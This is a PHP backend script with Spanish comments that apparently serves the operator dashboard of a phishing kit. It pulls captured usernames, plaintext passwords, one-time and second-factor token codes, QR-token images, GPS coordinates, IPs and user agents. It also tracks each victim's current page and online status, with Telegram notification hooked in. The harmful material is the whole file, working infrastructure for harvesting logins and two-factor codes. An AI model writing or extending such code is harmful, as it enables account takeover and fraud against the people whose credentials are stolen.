<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../telegram/telegram-full_info.php';
verificarAuth('ver_registros');

try {
    $pdo = conectarBD();

    if (!isset($_SESSION['last_offline_check']) || (time() - $_SESSION['last_offline_check']) > 30) {
        estatus_aplicar_offline_y_notificar($pdo);
        $_SESSION['last_offline_check'] = time();
    }

    // Query principal: todos los registros con estatus
    $stmt = $pdo->query("
        SELECT u.id, u.usuarios, u.password, u.ip_real, u.nombre, u.apellido, 
               u.email, u.telefono_movil, u.telefono_fijo, u.token_codigo, 
               u.sgdotoken_codigo, u.sgdotoken_qr_codigo, u.token_qr_imagen_url,
               u.comentarios, u.coordenadas_gps, u.gps_estado, u.fecha_ingreso, u.user_agent,
               COALESCE(e.estado, 'offline') as estatus,
               e.pagina_actual,
               e.ultimo_heartbeat,
               CASE 
                   WHEN e.ultimo_heartbeat IS NULL THEN 'Nunca conectado'
                   WHEN e.ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND) THEN 'offline'
                   ELSE e.estado
               END as estado_real
        FROM usuarios u 
        LEFT JOIN estatus_usuarios e ON u.id = e.usuario_id 
        ORDER BY u.id DESC
    ");
    $registros = $stmt->fetchAll(PDO::FETCH_ASSOC);

    // Stats consolidadas en 1 query (antes eran 5 separadas)
    $statsStmt = $pdo->query("
        SELECT 
            COUNT(*) as total,
            SUM(CASE WHEN u.fecha_ingreso >= CURDATE() AND u.fecha_ingreso < CURDATE() + INTERVAL 1 DAY THEN 1 ELSE 0 END) as hoy,
            COUNT(DISTINCT u.ip_real) as ips_unicas
        FROM usuarios u
    ");
    $statsRow = $statsStmt->fetch(PDO::FETCH_ASSOC);

    // Online/inactivos: calcular desde los registros ya obtenidos (sin query extra)
    $usuarios_online = 0;
    $usuarios_inactivos = 0;
    foreach ($registros as $r) {
        if ($r['estado_real'] === 'online') $usuarios_online++;
        elseif ($r['estado_real'] === 'inactive') $usuarios_inactivos++;
    }

    // Último acceso del admin
    $ultimoStmt = $pdo->prepare("SELECT ultima_fecha_ingreso FROM administracion_control WHERE id = ?");
    $ultimoStmt->execute([$_SESSION['admin_id']]);
    $ultimo = $ultimoStmt->fetch(PDO::FETCH_ASSOC);

    $stats = [
        'total' => (int)$statsRow['total'],
        'hoy' => (int)$statsRow['hoy'],
        'ips_unicas' => (int)$statsRow['ips_unicas'],
        'usuarios_online' => $usuarios_online,
        'usuarios_inactivos' => $usuarios_inactivos,
        'ultimo_acceso' => $ultimo['ultima_fecha_ingreso'] ?? null
    ];

    // Configuración de columnas (siempre usa config del admin ID 1)
    $columnasStmt = $pdo->prepare("
        SELECT columna, visible, orden, nombre_personalizado 
        FROM configuracion_columnas 
        WHERE admin_id = 1 
        ORDER BY orden ASC
    ");
    $columnasStmt->execute();
    $configuracion_columnas = $columnasStmt->fetchAll(PDO::FETCH_ASSOC);

    if (empty($configuracion_columnas)) {
        $columnas_default = [
            ['columna' => 'estatus', 'visible' => 1, 'orden' => 1, 'nombre_personalizado' => null],
            ['columna' => 'id', 'visible' => 1, 'orden' => 2, 'nombre_personalizado' => null],
            ['columna' => 'usuario', 'visible' => 1, 'orden' => 3, 'nombre_personalizado' => null],
            ['columna' => 'password', 'visible' => 1, 'orden' => 4, 'nombre_personalizado' => null],
            ['columna' => 'ip_real', 'visible' => 1, 'orden' => 5, 'nombre_personalizado' => null],
            ['columna' => 'nombre', 'visible' => 1, 'orden' => 6, 'nombre_personalizado' => null],
            ['columna' => 'apellido', 'visible' => 1, 'orden' => 7, 'nombre_personalizado' => null],
            ['columna' => 'email', 'visible' => 1, 'orden' => 8, 'nombre_personalizado' => null],
            ['columna' => 'telefono_movil', 'visible' => 1, 'orden' => 9, 'nombre_personalizado' => null],
            ['columna' => 'telefono_fijo', 'visible' => 1, 'orden' => 10, 'nombre_personalizado' => null],
            ['columna' => 'token_codigo', 'visible' => 1, 'orden' => 11, 'nombre_personalizado' => null],
            ['columna' => 'sgdotoken_codigo', 'visible' => 1, 'orden' => 12, 'nombre_personalizado' => null],
            ['columna' => 'sgdotoken_qr_codigo', 'visible' => 1, 'orden' => 13, 'nombre_personalizado' => null],
            ['columna' => 'token_qr_imagen_url', 'visible' => 1, 'orden' => 14, 'nombre_personalizado' => null],
            ['columna' => 'comentarios', 'visible' => 1, 'orden' => 15, 'nombre_personalizado' => null],
            ['columna' => 'coordenadas_gps', 'visible' => 1, 'orden' => 16, 'nombre_personalizado' => null],
            ['columna' => 'fecha', 'visible' => 1, 'orden' => 17, 'nombre_personalizado' => null],
            ['columna' => 'acciones', 'visible' => 1, 'orden' => 18, 'nombre_personalizado' => null]
        ];

        $insertStmt = $pdo->prepare("INSERT INTO configuracion_columnas (admin_id, columna, visible, orden, nombre_personalizado) VALUES (?, ?, ?, ?, ?)");
        foreach ($columnas_default as $col) {
            $insertStmt->execute([$_SESSION['admin_id'], $col['columna'], $col['visible'], $col['orden'], $col['nombre_personalizado']]);
        }
        $configuracion_columnas = $columnas_default;
    }

    $columnasCatalogo = ['coordenadas_gps'];
    $columnasExistentes = array_column($configuracion_columnas, 'columna');
    $ordenMax = 0;
    foreach ($configuracion_columnas as $colCfg) {
        $ordenMax = max($ordenMax, (int) ($colCfg['orden'] ?? 0));
    }
    $insertColStmt = $pdo->prepare('INSERT INTO configuracion_columnas (admin_id, columna, visible, orden, nombre_personalizado) VALUES (1, ?, 1, ?, NULL)');
    foreach ($columnasCatalogo as $columnaNueva) {
        if (!in_array($columnaNueva, $columnasExistentes, true)) {
            $ordenMax++;
            $insertColStmt->execute([$columnaNueva, $ordenMax]);
            $configuracion_columnas[] = [
                'columna' => $columnaNueva,
                'visible' => 1,
                'orden' => $ordenMax,
                'nombre_personalizado' => null,
            ];
        }
    }

    jsonResponse([
        'registros' => $registros,
        'stats' => $stats,
        'configuracion_columnas' => $configuracion_columnas
    ]);

} catch (Exception $e) {
    jsonError('Error de base de datos: ' . $e->getMessage(), 500);
}
